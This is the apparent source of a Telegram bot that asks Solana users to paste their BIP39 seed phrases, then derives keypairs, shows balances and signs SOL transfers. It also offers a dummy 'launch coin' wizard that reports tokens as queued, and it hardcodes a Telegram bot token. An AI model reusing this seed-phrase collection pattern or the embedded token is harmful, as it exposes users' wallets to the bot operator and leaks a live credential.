"""
ProTools Bundler Bot
====================
- Wallet  : user pastes BIP39 phrase → derives Solana keypair → shows address + SOL balance
- Airdrop : user pastes phrase + recipient + amount → signs & sends real SOL transfer
- Launch Coin : dummy wizard (no on-chain action)
- Transactions, Logs, Help, Feedback : all functional
Deploy on Render (Python 3.11) + UptimeRobot ping.
"""

import logging
import os
import sqlite3
from datetime import datetime
from threading import Thread

import httpx
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# solders / solana-py
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
from solders.transaction import Transaction
from solders.message import Message
from solana.rpc.async_api import AsyncClient

# BIP39 / HD derivation
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

# ─── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
SOLANA_RPC = os.getenv("SOLANA_RPC", "https://api.mainnet-beta.solana.com")
PORT       = int(os.getenv("PORT", 8000))

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── Conversation States ────────────────────────────────────────────────────────
(
    WALLET_PHRASE,
    AIRDROP_PHRASE,
    AIRDROP_RECIPIENT,
    AIRDROP_AMOUNT,
    AIRDROP_CONFIRM,
    LAUNCH_NAME,
    LAUNCH_SYMBOL,
    LAUNCH_DESC,
    LAUNCH_CONFIRM,
    FEEDBACK_TEXT,
) = range(10)

# ─── Database ───────────────────────────────────────────────────────────────────
DB_PATH = "protools.db"


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id    INTEGER PRIMARY KEY,
            username   TEXT,
            address    TEXT,
            created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id   INTEGER,
            action    TEXT,
            detail    TEXT,
            timestamp TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS feedback (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id   INTEGER,
            username  TEXT,
            message   TEXT,
            timestamp TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS coins (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            name        TEXT,
            symbol      TEXT,
            description TEXT,
            status      TEXT DEFAULT 'pending',
            created_at  TEXT
        )
    """)
    conn.commit()
    conn.close()


def log_action(user_id: int, action: str, detail: str = ""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO logs (user_id, action, detail, timestamp) VALUES (?, ?, ?, ?)",
        (user_id, action, detail, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()


def get_saved_address(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def save_address(user_id: int, username: str, address: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO users (user_id, username, address, created_at) VALUES (?, ?, ?, ?)",
        (user_id, username, address, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()


# ─── Solana Helpers ─────────────────────────────────────────────────────────────

def phrase_to_keypair(phrase: str) -> Keypair:
    """Derive Solana keypair from BIP39 mnemonic (m/44'/501'/0'/0')."""
    seed_bytes = Bip39SeedGenerator.Generate(phrase.strip(), "")
    bip44_ctx = (
        Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
        .Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
    )
    private_key_bytes = bip44_ctx.PrivateKey().Raw().ToBytes()
    return Keypair.from_seed(private_key_bytes)


def validate_phrase(phrase: str) -> bool:
    words = phrase.strip().split()
    if len(words) not in (12, 24):
        return False
    mnemo = Mnemonic("english")
    return mnemo.check(phrase.strip())


def validate_solana_address(addr: str) -> bool:
    try:
        Pubkey.from_string(addr.strip())
        return True
    except Exception:
        return False


async def get_sol_balance(address: str) -> float:
    async with AsyncClient(SOLANA_RPC) as client:
        pubkey = Pubkey.from_string(address)
        resp = await client.get_balance(pubkey)
        return resp.value / 1_000_000_000


async def send_sol(keypair: Keypair, recipient: str, amount_sol: float) -> str:
    async with AsyncClient(SOLANA_RPC) as client:
        lamports   = int(amount_sol * 1_000_000_000)
        to_pubkey  = Pubkey.from_string(recipient.strip())
        from_pubkey = keypair.pubkey()

        bh_resp = await client.get_latest_blockhash()
        recent_blockhash = bh_resp.value.blockhash

        ix  = transfer(TransferParams(from_pubkey=from_pubkey, to_pubkey=to_pubkey, lamports=lamports))
        msg = Message.new_with_blockhash([ix], from_pubkey, recent_blockhash)
        tx  = Transaction([keypair], msg, recent_blockhash)

        resp = await client.send_transaction(tx)
        return str(resp.value)


# ─── Keyboards ─────────────────────────────────────────────────────────────────

MAIN_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"),
        InlineKeyboardButton("📊 Transactions", callback_data="transactions"),
    ],
    [
        InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"),
        InlineKeyboardButton("🔑 Wallet",       callback_data="wallet"),
    ],
    [
        InlineKeyboardButton("📋 Logs",         callback_data="logs"),
        InlineKeyboardButton("❓ Help",          callback_data="help"),
    ],
    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
])

CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

CONFIRM_KB = InlineKeyboardMarkup([[
    InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"),
    InlineKeyboardButton("❌ Cancel",  callback_data="cancel"),
]])

BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])

WELCOME_TEXT = (
    "🌐 *Welcome to ProTools Bundler\!*\n\n"
    "Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
    "ProTools is more than a tool – it's your edge in the degen arena\. "
    "Let the games begin\! 🎯🔥\n\n"
    "Choose an option below:"
)


# ─── Start / Menu ───────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_action(update.effective_user.id, "START")
    await update.message.reply_text(WELCOME_TEXT, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)


async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    await query.edit_message_text(WELCOME_TEXT, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)


# ─── WALLET ────────────────────────────────────────────────────────────────────

async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "WALLET_VIEW")
    saved = get_saved_address(update.effective_user.id)

    if saved:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Re-import Phrase",  callback_data="wallet_import")],
            [InlineKeyboardButton("💰 Refresh Balance",   callback_data="wallet_balance")],
            [InlineKeyboardButton("🔙 Back to Menu",      callback_data="back_to_menu")],
        ])
        await query.edit_message_text(
            f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Tap address to copy_",
            parse_mode="MarkdownV2", reply_markup=kb,
        )
    else:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Import Phrase", callback_data="wallet_import")],
            [InlineKeyboardButton("🔙 Back to Menu",  callback_data="back_to_menu")],
        ])
        await query.edit_message_text(
            "🔑 *Wallet*\n\nNo wallet linked yet\\.\n\nImport your BIP39 seed phrase to get started\\.",
            parse_mode="MarkdownV2", reply_markup=kb,
        )


async def wallet_balance_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Fetching balance...")
    saved = get_saved_address(update.effective_user.id)
    if not saved:
        await query.answer("No wallet linked.", show_alert=True)
        return
    try:
        balance = await get_sol_balance(saved)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Re-import Phrase", callback_data="wallet_import")],
            [InlineKeyboardButton("💰 Refresh Balance",  callback_data="wallet_balance")],
            [InlineKeyboardButton("🔙 Back to Menu",     callback_data="back_to_menu")],
        ])
        await query.edit_message_text(
            f"🔑 *Your Wallet*\n\n`{saved}`\n\n💰 *Balance:* `{balance:.6f} SOL`",
            parse_mode="MarkdownV2", reply_markup=kb,
        )
    except Exception as e:
        logger.error(f"Balance error: {e}")
        await query.answer("Failed to fetch balance. Try again.", show_alert=True)


async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔑 *Import Wallet*\n\n"
        "Send your *BIP39 seed phrase* \\(12 or 24 words\\)\n\n"
        "⚠️ _Your message will be deleted immediately for security\\._",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return WALLET_PHRASE


async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user   = update.effective_user
    phrase = update.message.text.strip()
    try:
        await update.message.delete()
    except Exception:
        pass

    if not validate_phrase(phrase):
        await update.effective_chat.send_message(
            "❌ *Invalid phrase*\n\nMust be a valid 12 or 24\\-word BIP39 mnemonic\\. Try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return WALLET_PHRASE

    msg = await update.effective_chat.send_message("⏳ Deriving keypair\\.\\.\\.", parse_mode="MarkdownV2")
    try:
        keypair = phrase_to_keypair(phrase)
        address = str(keypair.pubkey())
        balance = await get_sol_balance(address)
        save_address(user.id, user.username or "", address)
        log_action(user.id, "WALLET_IMPORT", address[:8] + "...")

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Refresh Balance", callback_data="wallet_balance")],
            [InlineKeyboardButton("🔙 Back to Menu",    callback_data="back_to_menu")],
        ])
        await msg.edit_text(
            f"✅ *Wallet Linked\!*\n\n"
            f"*Address:* `{address}`\n"
            f"*Balance:* `{balance:.6f} SOL`",
            parse_mode="MarkdownV2", reply_markup=kb,
        )
    except Exception as e:
        logger.error(f"Wallet import error: {e}")
        await msg.edit_text(
            "❌ Failed to derive keypair\\. Check your phrase and try again\\.",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return WALLET_PHRASE

    return ConversationHandler.END


# ─── AIRDROP ───────────────────────────────────────────────────────────────────

async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "AIRDROP_START")
    await query.edit_message_text(
        "🎁 *Airdrop SOL*\n\n"
        "Step 1 of 3 — Send your *BIP39 seed phrase* \\(12 or 24 words\\)\n\n"
        "⚠️ _Phrase is used to sign the tx locally and is never stored\\._",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_PHRASE


async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try:
        await update.message.delete()
    except Exception:
        pass

    if not validate_phrase(phrase):
        await update.effective_chat.send_message(
            "❌ *Invalid phrase*\n\nMust be 12 or 24 valid BIP39 words\\. Try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_PHRASE

    try:
        keypair = phrase_to_keypair(phrase)
        address = str(keypair.pubkey())
        balance = await get_sol_balance(address)
    except Exception as e:
        logger.error(f"Airdrop phrase error: {e}")
        await update.effective_chat.send_message(
            "❌ Failed to derive keypair\\. Check your phrase\\.",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_PHRASE

    # Store phrase in memory only — NOT saved to DB
    context.user_data["airdrop_phrase"]  = phrase
    context.user_data["airdrop_sender"]  = address
    context.user_data["airdrop_balance"] = balance

    await update.effective_chat.send_message(
        f"✅ *Sender identified*\n\n"
        f"*Address:* `{address}`\n"
        f"*Balance:* `{balance:.6f} SOL`\n\n"
        f"Step 2 of 3 — Enter the *recipient* Solana address:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_RECIPIENT


async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    recipient = update.message.text.strip()
    if not validate_solana_address(recipient):
        await update.message.reply_text(
            "❌ Invalid Solana address\\. Try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_RECIPIENT

    context.user_data["airdrop_recipient"] = recipient
    balance = context.user_data.get("airdrop_balance", 0)
    await update.message.reply_text(
        f"Step 3 of 3 — Enter *amount in SOL* to send\\.\n\n"
        f"Available: `{balance:.6f} SOL`",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_AMOUNT


async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text.strip())
        if amount <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "❌ Enter a valid positive number \\(e\\.g\\. `0.5`\\):",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_AMOUNT

    balance = context.user_data.get("airdrop_balance", 0)
    if amount >= balance:
        await update.message.reply_text(
            f"❌ Insufficient balance\\.\n\nAvailable: `{balance:.6f} SOL`\n\nEnter a lower amount:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_AMOUNT

    context.user_data["airdrop_amount"] = amount
    sender    = context.user_data["airdrop_sender"]
    recipient = context.user_data["airdrop_recipient"]

    await update.message.reply_text(
        f"🎁 *Confirm Airdrop*\n\n"
        f"*From:* `{sender[:8]}\.\.\.{sender[-4:]}`\n"
        f"*To:* `{recipient[:8]}\.\.\.{recipient[-4:]}`\n"
        f"*Amount:* `{amount} SOL`\n\n"
        f"Send this transaction?",
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB,
    )
    return AIRDROP_CONFIRM


async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user

    phrase    = context.user_data.get("airdrop_phrase")
    recipient = context.user_data.get("airdrop_recipient")
    amount    = context.user_data.get("airdrop_amount")

    await query.edit_message_text("⏳ Sending transaction\\.\\.\\.", parse_mode="MarkdownV2")

    try:
        keypair = phrase_to_keypair(phrase)
        sig = await send_sol(keypair, recipient, amount)
        log_action(user.id, "AIRDROP_SENT", f"{amount} SOL to {recipient[:8]}...")

        await query.edit_message_text(
            f"✅ *Airdrop Sent\!*\n\n"
            f"*Amount:* `{amount} SOL`\n"
            f"*To:* `{recipient}`\n\n"
            f"*Tx Signature:*\n`{sig}`\n\n"
            f"[View on Solscan](https://solscan\\.io/tx/{sig})",
            parse_mode="MarkdownV2", reply_markup=BACK_KB,
        )
    except Exception as e:
        logger.error(f"Airdrop send error: {e}")
        await query.edit_message_text(
            f"❌ *Transaction failed*\n\n`{str(e)[:200]}`\n\nCheck balance and try again\\.",
            parse_mode="MarkdownV2", reply_markup=BACK_KB,
        )

    context.user_data.clear()
    return ConversationHandler.END


# ─── TRANSACTIONS ───────────────────────────────────────────────────────────────

async def transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    log_action(update.effective_user.id, "TRANSACTIONS_VIEW")

    if not saved:
        await query.edit_message_text(
            "📊 *Transactions*\n\n⚠️ No wallet linked\\. Import your phrase in Wallet first\\.",
            parse_mode="MarkdownV2",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Go to Wallet", callback_data="wallet")],
                [InlineKeyboardButton("🔙 Back",         callback_data="back_to_menu")],
            ]),
        )
        return

    await query.edit_message_text("⏳ Fetching transactions\\.\\.\\.", parse_mode="MarkdownV2")
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(SOLANA_RPC, json={
                "jsonrpc": "2.0", "id": 1,
                "method": "getSignaturesForAddress",
                "params": [saved, {"limit": 5}],
            })
        sigs = resp.json().get("result", [])

        if not sigs:
            text = f"📊 *Transactions*\n\n`{saved[:8]}\.\.\.{saved[-4:]}`\n\nNo transactions found\\."
        else:
            lines = [f"📊 *Recent Transactions*\n\n`{saved[:8]}\.\.\.{saved[-4:]}`\n"]
            for s in sigs:
                sig    = s.get("signature", "")[:16] + "..."
                slot   = s.get("slot", "?")
                status = "✅" if s.get("err") is None else "❌"
                lines.append(f"{status} `{sig}` — slot {slot}")
            text = "\n".join(lines)

        await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
    except Exception as e:
        logger.error(f"Tx fetch error: {e}")
        await query.edit_message_text(
            "❌ Failed to fetch transactions\\. Try again later\\.",
            parse_mode="MarkdownV2", reply_markup=BACK_KB,
        )


# ─── LAUNCH COIN (dummy) ───────────────────────────────────────────────────────

async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "LAUNCH_COIN_START")
    await query.edit_message_text(
        "🚀 *Launch Coin*\n\nEnter the token name \\(1–50 characters\\):",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return LAUNCH_NAME


async def launch_get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text.strip()
    if not 1 <= len(name) <= 50:
        await update.message.reply_text(
            "❌ Name must be 1–50 characters\\. Try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return LAUNCH_NAME
    context.user_data["coin_name"] = name
    await update.message.reply_text(
        "🏷 Enter token symbol \\(2–10 chars, e\\.g\\. PEPE\\):",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return LAUNCH_SYMBOL


async def launch_get_symbol(update: Update, context: ContextTypes.DEFAULT_TYPE):
    symbol = update.message.text.strip().upper()
    if not 2 <= len(symbol) <= 10:
        await update.message.reply_text(
            "❌ Symbol must be 2–10 characters\\. Try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return LAUNCH_SYMBOL
    context.user_data["coin_symbol"] = symbol
    await update.message.reply_text(
        "📝 Enter a short token description \\(max 200 chars\\):",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return LAUNCH_DESC


async def launch_get_desc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    desc   = update.message.text.strip()[:200]
    name   = context.user_data["coin_name"]
    symbol = context.user_data["coin_symbol"]
    context.user_data["coin_desc"] = desc
    await update.message.reply_text(
        f"🚀 *Confirm Token*\n\n"
        f"*Name:* {name}\n*Symbol:* {symbol}\n*Description:* {desc}\n\n"
        f"_\\(Preview mode — no on\\-chain action\\)_\n\nProceed?",
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB,
    )
    return LAUNCH_CONFIRM


async def launch_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query  = update.callback_query
    await query.answer()
    user   = update.effective_user
    name   = context.user_data.get("coin_name")
    symbol = context.user_data.get("coin_symbol")
    desc   = context.user_data.get("coin_desc", "")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO coins (user_id, name, symbol, description, created_at) VALUES (?, ?, ?, ?, ?)",
        (user.id, name, symbol, desc, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()
    log_action(user.id, "LAUNCH_COIN_DUMMY", f"{name} ({symbol})")

    await query.edit_message_text(
        f"🚀 *Token Queued\!*\n\n"
        f"*{name}* \\({symbol}\\) has been saved\\.\n\n"
        f"⚠️ _On\\-chain launch coming soon\\._",
        parse_mode="MarkdownV2", reply_markup=BACK_KB,
    )
    context.user_data.clear()
    return ConversationHandler.END


# ─── LOGS ──────────────────────────────────────────────────────────────────────

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "SELECT action, detail, timestamp FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT 10",
        (update.effective_user.id,),
    )
    rows = c.fetchall()
    conn.close()

    if not rows:
        text = "📋 *Logs*\n\nNo activity recorded yet\\."
    else:
        lines = ["📋 *Your Activity Logs*\n"]
        for action, detail, ts in rows:
            detail_str = f" — {detail}" if detail else ""
            lines.append(f"• `{action}`{detail_str}\n  _{ts[:16].replace('T', ' ')}_")
        text = "\n".join(lines)

    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=BACK_KB)


# ─── HELP ──────────────────────────────────────────────────────────────────────

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "HELP_VIEW")
    await query.edit_message_text(
        "❓ *ProTools Bundler — Help*\n\n"
        "*🚀 Launch Coin* — Register a token \\(preview mode\\)\n\n"
        "*📊 Transactions* — Recent on\\-chain activity for your wallet\n\n"
        "*🎁 Airdrop* — Sign & send SOL using your seed phrase\n\n"
        "*🔑 Wallet* — Import BIP39 phrase → shows address \\+ balance\n\n"
        "*📋 Logs* — Your bot activity history\n\n"
        "*💬 Feedback* — Submit feedback or bug reports\n\n"
        "_/start — return to main menu anytime_",
        parse_mode="MarkdownV2", reply_markup=BACK_KB,
    )


# ─── FEEDBACK ──────────────────────────────────────────────────────────────────

async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💬 *Feedback*\n\nSend your feedback, suggestions, or bug report:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return FEEDBACK_TEXT


async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO feedback (user_id, username, message, timestamp) VALUES (?, ?, ?, ?)",
        (user.id, user.username or "", text, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()
    log_action(user.id, "FEEDBACK", text[:50])
    await update.message.reply_text(
        "✅ *Thanks for your feedback\\!*\n\nOur team will review it shortly\\. 🙏",
        parse_mode="MarkdownV2", reply_markup=BACK_KB,
    )
    return ConversationHandler.END


# ─── CANCEL ────────────────────────────────────────────────────────────────────

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    await query.edit_message_text(
        "❌ Cancelled\\.", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD,
    )
    return ConversationHandler.END


# ─── Flask Health ───────────────────────────────────────────────────────────────

health_app = Flask(__name__)

@health_app.route("/")
def health():
    return "OK", 200

def run_health():
    health_app.run(host="0.0.0.0", port=PORT)


# ─── Main ───────────────────────────────────────────────────────────────────────

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    wallet_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
        per_message=False,
    )

    airdrop_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
        states={
            AIRDROP_PHRASE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
            AIRDROP_AMOUNT:    [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
            AIRDROP_CONFIRM:   [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
        per_message=False,
    )

    launch_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
        states={
            LAUNCH_NAME:    [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_name)],
            LAUNCH_SYMBOL:  [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_symbol)],
            LAUNCH_DESC:    [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_desc)],
            LAUNCH_CONFIRM: [CallbackQueryHandler(launch_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
        per_message=False,
    )

    feedback_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
        per_message=False,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(wallet_conv)
    app.add_handler(airdrop_conv)
    app.add_handler(launch_conv)
    app.add_handler(feedback_conv)
    app.add_handler(CallbackQueryHandler(wallet_entry,           pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(wallet_balance_refresh, pattern="^wallet_balance$"))
    app.add_handler(CallbackQueryHandler(transactions,           pattern="^transactions$"))
    app.add_handler(CallbackQueryHandler(show_logs,              pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(show_help,              pattern="^help$"))
    app.add_handler(CallbackQueryHandler(back_to_menu,           pattern="^back_to_menu$"))
    app.add_handler(CallbackQueryHandler(cancel,                 pattern="^cancel$"))

    Thread(target=run_health, daemon=True).start()
    logger.info(f"Health server on :{PORT}")
    logger.info("Bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
